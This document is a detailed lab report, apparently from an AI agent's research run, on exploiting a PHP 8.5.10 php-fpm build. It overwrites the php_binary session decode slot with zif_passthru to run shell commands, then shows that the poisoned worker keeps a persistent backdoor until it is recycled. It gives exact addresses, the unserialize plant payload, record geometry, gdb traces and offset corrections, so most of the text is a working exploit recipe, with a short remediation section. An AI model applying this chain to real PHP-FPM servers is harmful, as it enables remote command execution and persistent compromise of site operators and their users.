# realzif 20261022T013000Z — installed realapps PHP 8.5.10 `php-fpm`: `zif_passthru` via `ps_serializers[2].decode`, plus persistent-poison characterization

Local run window: 2026-10-22 01:31–01:35 +0200 (2026-10-21 23:31–23:35 UTC).
Private lab only: own master/worker, docroot, sessions, logs, config and TCP port
`127.0.0.1:28890`. No MediaWiki, no shared FPM/nginx/DB. ASLR disabled per
instance with `setarch x86_64 -R`. Request budget 40; 8 exchanges used.

## 0. Result

Two independent findings:

1. **The distro binary executes `zif_passthru` through a session decode slot,
   and the worker survives.** The slot used is **`ps_serializers[2].decode`
   (`0x22c54e0`, entry name `php_binary`)**, not the user-supplied
   `ps_serializers[1].decode` (`0x22c54c8`). The command created the marker,
   the response was the same worker PID, `php_exec` returned (`AFTER eax=0`),
   and FPM logged no SIGSEGV for the final request.
2. **The poison persists per worker and is only cleared by worker recycling.**
   After the exploit, the worker's `ps_serializers[2].decode` remained
   `0xa3c074`. A subsequent normal `session_start()` request that decoded a
   controlled `num_args=0` session file returned a PHP fatal
   (`ArgumentCountError`) but did **not** crash or recycle the worker; the slot
   was still `0xa3c074`. A subsequent normal request whose session file supplied
   `num_args=1` and an invalid arg pointer did crash the worker in
   `zend_str_has_nul_byte()`; FPM respawned it from the pristine master, and the
   new worker's slot was back to the real decode `0x9e6dd5`. The same benign
   session request then returned 200 `FOO=bar`. The worker must therefore be
   recycled proactively; a non-crashing failure does not clear the backdoor.

The supplied `zif_passthru` address `0xa3c074` is correct. The supplied
`ps_serializers[1].decode` address is arithmetically correct for entry 1, but
entry 1 is the `php` handler; the `php_binary` entry is index 2. The
`zif_passthru - zif_system` delta is `0x13` on this build, not the V6 `0x10`.

## 1. Target and static verification

| item | value |
|---|---|
| binary | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm` |
| md5 | `4ee099823b75e16ea36f93c71d57bfd8` |
| ELF | `ET_EXEC` (non-PIE), not stripped, debug info |
| version | PHP 8.5.10 (fpm-fcgi), NTS, Zend Engine 4.5.10 |
| shared libs | `LD_LIBRARY_PATH=/tmp/opencode/realapps/icu-out/lib` (ICU 78) |
| php.ini | `-n` (isolated; no realapps/MediaWiki ini) |

`ps_serializers` is a 33-element array of 24-byte structs at **`0x22c54a0`**
(`name +0x0`, `encode +0x8`, `decode +0x10`). The live/static entries are:

| idx | struct | name | encode | decode | decode slot |
|---|---|---|---|---|---|
| 0 | `0x22c54a0` | `php_serialize` | `0x9e2078` | `0x9e20de` | `0x22c54b0` |
| 1 | `0x22c54b8` | `php` | `0x9e7112` | `0x9e6fae` | **`0x22c54c8`** |
| 2 | `0x22c54d0` | `php_binary` | `0x9e6b15` | `0x9e6dd5` | **`0x22c54e0`** |
| 3 | `0x22c54e8` | NULL | NULL | NULL | `0x22c54f8` |

Other static facts confirmed on this binary:

* `ps_globals = 0x22d0dc0`; the cached serializer field is
  `ps_globals+0x160 = 0x22d0f20`.
* `php_session_decode` at `0x9e68b5` loads `0x22d0f20` at `0x9e68f7` and does
  `call *0x10(%rax)` at **`0x9e68fe`** with `rdi = ZSTR_VAL(data)` and
  `rsi = ZSTR_LEN(data)`.
* `zif_exec = 0xa3c04e` (mode 0), `zif_system = 0xa3c061` (mode 1),
  `zif_passthru = 0xa3c074` (mode 3). Each symbol has size **`0x13` (19 bytes)**:
  `sub $0x8,%rsp; mov $mode,%edx; call 0xa3bdfd <php_exec_ex>; add $0x8,%rsp; ret`.
* `php_exec_ex = 0xa3bdfd`, `php_exec = 0xa3bbd7`; the no-array
  `call php_exec` is at `0xa3c042` and its return probe is `0xa3c047`.
* `sizeof(zend_execute_data) = 80`; `ZEND_CALL_NUM_ARGS = +0x2c`,
  arg1 zval value = `+0x50`, type byte = `+0x58` (verified with DWARF).

Live dispatch check at decode hit 1 (`phase/calib_gdb.txt`):

```
DECODE hit=1 data=0x7ffff466a000 val=0x7ffff466a018 len=131014
  level=1 bgdata=0x7ffff4681000 ser2decode=0x9e6dd5 ser2encode=0x9e6b15
  pser=0x22c54d0
```

`pser=0x22c54d0` is `&ps_serializers[2]`, and `ser2decode=0x9e6dd5` is the real
`php_binary` decode. Entry 1's slot remained `0x9e6fae` throughout.

## 2. Private lab

* Config: `conf/fpm.conf`, pool `lab`, static, `pm.max_children=1`,
  `pm.max_requests=0`, `session.serialize_handler=php_binary`,
  `session.save_handler=files`, upload progress enabled (`freq=1%`,
  `min_freq=3600`, `cleanup=0`, empty prefix), own save path.
* Launcher: `start.sh` with
  `LD_LIBRARY_PATH=/tmp/opencode/realapps/icu-out/lib`, `setarch x86_64 -R`,
  `php-fpm -n --fpm-config ...`.
* Master **142049**. Initial worker **142050**. Final exploit worker **142370**.
  Poison respawn worker **143459**. Port 28890 closed at close; master exited.
* No shared service was contacted: 4052217/4052937/4053032/4054145 were only
  checked by PID identity, never signalled or connected to.

## 3. Exploit run

Plant (`unser.php`, urlencoded): `a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";}X`.
The trailing byte produces an `unserialize()` warning; the error handler raises
`E_USER_ERROR`, bailing out and leaving `BG(unserialize).level = 1`. The script
sets `memory_limit=64M` (the bailout comes from the handler, not an OOM).

Post-plant state (`phase/plant1_state.txt`, same P/B0 after re-plant on the
respawned worker):

```
BG level=1 data=0x7ffff4681000
last=0x7ffff4681038 first_dtor=0x7ffff4684000 last_dtor=0x7ffff4684000
cur=0 max=4096 entries.used=3 entries.next=(nil)
dtor used=1 next=(nil)
```

Calibration (`K=0`, same record builder, target `0xa3c074`):

| item | value |
|---|---|
| X1 (first decode buffer) | `0x7ffff466a000` |
| X2 (re-encoded buffer) | `0x7ffff46ae000` |
| T1 / T2 | 131014 / 131313 |
| hit 1 length | 131014 (`ser2decode=0x9e6dd5`) |
| hit 2 length | 131313 (`ser2decode=0x9e6dd5`, real decode) |
| calibration worker | 142050, crashed after the hit-2 measurement; FPM respawned 142370 |

The calibration request itself still uses the fake P/B0 and K=0; the worker
died after the hit-2 measurement, the same calibration artifact seen in V6.
This is not the final exploit path: the measurement is complete before the
crash. The worker was respawned, re-planted, P/B0 re-measured (identical), and
the final record was run on 142370.

Final record (`phase/mkrec_final.json`):

| item | value |
|---|---|
| total | 131014 |
| rec1 length | 108 (`i:10731636;`, target decimal key length 8) |
| record-2 payload L | 130892 |
| payload start Q | **120 (`0x78`)** |
| fake P / B0 | `0x7ffff4681000` / `0x7ffff4684000` |
| K | `-8796078587571` |
| A target | `0x22c54e0` (`ps_serializers[2].decode`) |
| write value | `0xa3c074` (`zif_passthru`) |
| F (fake `zend_string*`) | `0x7ffff46ae190` |
| command length | 67 |
| command | `touch /tmp/opencode/research/realzif_20261022T013000Z/PASSTHRU_REAL` |

The final gdb log (`phase/final_gdb.txt`) shows the complete path:

```
DECODE hit=1 data=0x7ffff466a000 val=0x7ffff466a018 len=131014 level=1
  bgdata=0x7ffff4681000 ser2decode=0x9e6dd5 ser2encode=0x9e6b15 pser=0x22c54d0

DECODE hit=2 data=0x7ffff46ae000 val=0x7ffff46ae018 len=131313 level=1
  bgdata=0x7ffff4681000 ser2decode=0xa3c074 ser2encode=0x9e6b15 pser=0x22c54d0
0x22c54e0 <ps_serializers+64>: 0x0000000000a3c074

ZIF_PASSTHRU hit rdi=0x7ffff46ae018 rsi=0x200f1
PHP_EXEC_EX rdi=0x7ffff46ae018 rsi=0x200f1 rdx=0x3 numargs=1
  arg1val=0x7ffff46ae190 arg1type=6
F=0x7ffff46ae190 F+0x10(len)=67
0x7ffff46ae1a8: "touch /tmp/opencode/research/realzif_20261022T013000Z/PASSTHRU_REAL"
PHP_EXEC type=3 cmd=0x7ffff46ae1a8 array=(nil) retval=0x200f1
[Detaching after vfork from child process 142976]
AFTER_PHP_EXEC eax=0
```

Final response: `X-Powered-By: PHP/8.5.10`, body `PID=142370`, same worker
PID before and after; marker created at
`2026-10-22 01:33:05.589960259 +0200`, inode `3203722`, size 0. FPM recorded no
SIGSEGV for this request. Post-exploit worker table
(`phase/post_final_worker_ser.txt`):

```
0x22c54c0 <ps_serializers+32>: 0x...9e7112 0x...9e6fae   <- entry 1 (php)
0x22c54d0 <ps_serializers+48>: 0x...1018cef 0x...9e6b15 <- entry 2 (php_binary)
0x22c54e0 <ps_serializers+64>: 0x...a3c074
```

The master's slot remained pristine (`phase/post_final_master_ser.txt`):
`ps_serializers[2].decode = 0x9e6dd5`.

## 4. Persistent poison — normal requests after the exploit

### 4.1 Clean failure does not clear the poison

A normal `sess.php` request (`session_start()` with no arguments) with
`PHPSESSID=ctrl` decoded a 141-byte valid `php_binary` session file whose byte
at offset `0x2c` (`ZEND_CALL_NUM_ARGS`) is zero. The patched decode dispatched
to `zif_passthru` -> `php_exec_ex`; the parameter parser failed before touching
arg1. Result:

* no connection reset; PHP fatal body:
  `Uncaught ArgumentCountError: session_start() expects at least 1 argument, 0 given`;
* worker 142370 stayed alive;
* `ps_serializers[2].decode` was still `0xa3c074`;
* FPM logged no SIGSEGV for this request.

`session_start()` itself accepts zero arguments — the same zero-argument call
succeeds on the pristine worker in §4.2. The “at least 1” message is consistent
with the nested `zif_passthru` parameter parser while the `session_start`
internal frame is current; the crash case in §4.2 confirms that nested path
directly. This clean failure is therefore a persistent, non-crashing
backdoor: the worker was not recycled, and the slot stayed patched.

### 4.2 A subsequent request with a different session file crashes and recycles

A second normal `sess.php` request (`PHPSESSID=crash`) decoded a 141-byte valid
`php_binary` session file with `num_args=1`, arg1 pointer
`0x4141414141414141`, arg1 type `IS_STRING`. gdb watched the poisoned call path
(`phase/poison_crash_gdb.txt`):

```
POISON_ZIF_PASSTHRU hit=1 rdi=0x7ffff467a0d8 rsi=0x8d
POISON_PHP_EXEC_EX rdi=0x7ffff467a0d8 rsi=0x8d rdx=0x3
  numargs=1 arg1=0x4141414141414141 type=6

Program received signal SIGSEGV
0x00007ffff6981858 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
#0 vpcmpeqb (%rdi),%ymm16,%k0          rdi=0x4141414141414159
#1 zend_str_has_nul_byte (str=0x4141414141414141)  Zend/zend_API.h:947
#2 zend_parse_arg_path_str (...)                    Zend/zend_API.h:2329
#3 php_exec_ex (...)                               ext/standard/exec.c:207
#4 zif_passthru                                    ext/standard/exec.c:258
#5 php_session_decode (...)                        ext/session/session.c:294
#6 php_session_initialize                          ext/session/session.c:514
#7 php_session_start                               ext/session/session.c:1739
#8 zif_session_start                               ext/session/session.c:2698
```

FPM logged `child 142370 exited on signal 11 (SIGSEGV)` and started **143459**.
The new worker was pristine:

```
ps_serializers[2].decode = 0x9e6dd5
BG(unserialize).level = 0, data = NULL
```

A normal `session_start()` request with a 14-byte benign session file
(`\x03foo` + `s:3:"bar";`) then returned 200
`PID=143459 SID=recover FOO=bar`; the slot remained `0x9e6dd5` and no crash
occurred. This proves the poison is cleared by respawn/recycle because the
master never had the patched slot, and that the recycled worker serves normal
`php_binary` sessions again.

### 4.3 Operational impact

* The exploit modifies only the worker's private `.data`; the master keeps the
  original `0x9e6dd5`. A crash/reload of the worker therefore restores the real
  decode.
* A poisoned worker does not necessarily crash: a session file that yields
  `num_args=0` produces only a PHP fatal. That leaves the worker alive and the
  slot patched, so `pm.max_requests=0` (as in this lab) means the backdoor
  persists indefinitely. Even with a finite `pm.max_requests`, recycling is
  delayed and every intervening session decode runs through `zif_passthru`.
* The session file content is attacker-influenceable in a real deployment; it
  becomes the fake `execute_data` (`rdi = ZSTR_VAL(data)`). A file that supplies
  a readable string argument re-executes a command; a file with a bad pointer
  crashes the worker. The same `php_session_decode` slot is used by the
  pre-RINIT upload-progress path, so a multipart request can reach it
  automatically without the application calling `session_start()`.
* Remedy: after any suspicion of this exploit, kill/reload the pool workers
  immediately. FPM's automatic respawn on SIGSEGV happens to clear the poison,
  but it is not a safe remediation strategy; a non-crashing poisoned worker
  must be recycled explicitly.

## 5. Offset mismatches

1. **`ps_serializers[1].decode` is the wrong entry for `php_binary`.**
   `0x22c54c8` is indeed entry 1's decode slot, but entry 1 is `php` with real
   decode `0x9e6fae`. The `php_binary` entry is index 2; its decode slot is
   **`0x22c54e0`** and its real decode is `0x9e6dd5`. The final live table shows
   both simultaneously:
   `0x22c54c8 = 0x9e6fae` (unchanged) and `0x22c54e0 = 0xa3c074` (patched).
   Using `0x22c54c8` would overwrite the `php` decode slot; the
   `php_binary` dispatch at `0x22c54e0` would remain the real `0x9e6dd5`, so
   there would be no `zif_passthru` hit. The correct target was used.
2. **`zif_passthru - zif_system = 0x13`, not `0x10`.**
   Both symbols are 19-byte functions
   (`sub $8,%rsp; mov $mode,%edx; call php_exec_ex; add $8,%rsp; ret`), so
   `zif_system` at `0xa3c061` ends with `ret` at `0xa3c073` and `zif_passthru`
   starts at `0xa3c074`. The supplied `zif_passthru` address is correct; a V6
   `+0x10` derivation would give `0xa3c071`, which is inside `zif_system`'s
   `add $8,%rsp` sequence, not a function entry.
3. **Record geometry Q shifted from `0x77` to `0x78`.**
   The target `0xa3c074` is 10731636 (8 decimal digits), so record 1's
   `i:10731636;` is one byte longer than the V6 7-digit `zif_passthru` value and
   the record-2 payload starts at `Q = 0x78`, not `0x77`. The V6 builder
   hard-coded `0x77` in the arg1 pointer calculation; that would have pointed
   one byte before F. The builder now derives the pointer from Q. This is an
   exploit-record offset, not a binary offset.
4. `ps_globals+0x160`, the `ps_serializers` stride, the real entry-2 decode, and
   the fake-frame ABI (`0x2c/0x50/0x58`, 80-byte execute_data) all matched; no
   further binary mismatch was found.

## 6. Request ledger

| n | kind | label | result |
|---|---|---|---|
| 1 | probe | liveness | 200, `PID=142050` |
| 2 | plant | user_error | fatal `stop`, level=1, P/B0 `0x7ffff4681000`/`0x7ffff4684000` |
| 3 | calib | rcal | connection reset; hit1 X1 `0x7ffff466a000`, X2 `0x7ffff46ae000`, T2 131313; worker 142050 crashed after measurement, respawn 142370 |
| 4 | plant | user_error | fatal `stop`, same P/B0 on 142370 |
| 5 | trigger | rfin | 200 `PID=142370`; hit2 `ser2decode=0xa3c074`; marker; `AFTER eax=0`; worker alive |
| 6 | sess | ctrl | PHP fatal `ArgumentCountError`; worker 142370 alive; slot still `0xa3c074`; no SIGSEGV |
| 7 | sess | crash | connection reset; `zif_passthru`/`php_exec_ex` hit; SIGSEGV in `zend_str_has_nul_byte`; child 142370 respawned as 143459 |
| 8 | sess | recover | 200 `PID=143459 ... FOO=bar`; slot pristine `0x9e6dd5` |

`req/count.txt = 8`, `req/requests.log` has the full ledger.

## 7. Evidence index

| path | content |
|---|---|
| `phase/calib_gdb.txt`, `phase/calib_req.json`, `phase/mkrec_calib.json` | calibration hits, X1/X2, T2, K=0 record |
| `phase/plant1_state.txt`, `phase/plant2_state.txt`, `phase/plant2_ser.txt` | stale-chain state and serializer state |
| `phase/final_gdb.txt`, `phase/final_req.json`, `phase/mkrec_final.json` | decisive final run: hit2 `0xa3c074`, `zif_passthru`, `php_exec_ex`, `php_exec`, `AFTER eax=0`, marker |
| `phase/post_final_worker_ser.txt`, `phase/post_final_master_ser.txt` | persisted worker slot vs pristine master |
| `phase/poison_ctrl_req.json`, `phase/poison_ctrl_ser.txt` | clean-fatal poison persistence |
| `phase/poison_crash_gdb.txt`, `phase/poison_crash_req.json` | exact crash backtrace through the poisoned decode |
| `phase/post_crash_respawn_ser.txt`, `phase/recover_req.json`, `phase/recover_ser.txt` | pristine respawn and 200 recovery |
| `phase/PASSTHRU_REAL.copy`, marker stat in §3 | marker byte copy (inode differs from original) |
| `log/fpm-error.log` | no SIGSEGV for final; SIGSEGV for calibration and poison crash |
| `scripts/mkrec.py`, `scripts/mkpoison.py`, `scripts/drv.py`, `scripts/fcgi.py` | builders and request driver |
| `gdb/calib.gdb`, `gdb/final.gdb`, `gdb/poison_crash.gdb`, `gdb/state.gdb`, `gdb/ser.gdb` | probes |
| `conf/fpm.conf`, `start.sh` | private pool config and launcher |

## 8. Close

The lab was terminated with `SIGTERM` to master 142049 at 01:35:20. Port 28890
is closed, master/worker are gone, and no lab FPM process remains. No shared
service was touched.
